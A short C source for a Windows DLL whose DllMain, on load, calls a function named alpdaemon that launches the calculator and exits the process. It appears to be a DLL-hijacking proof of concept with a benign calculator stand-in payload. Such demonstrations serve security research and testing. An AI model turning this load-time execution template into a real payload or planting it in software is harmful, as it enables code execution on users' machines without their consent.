int alpdaemon()
{
  WinExec("calc", SW_SHOW);
  exit(0);
  return 0;
}
 
BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  alpdaemon();
  return 0;
}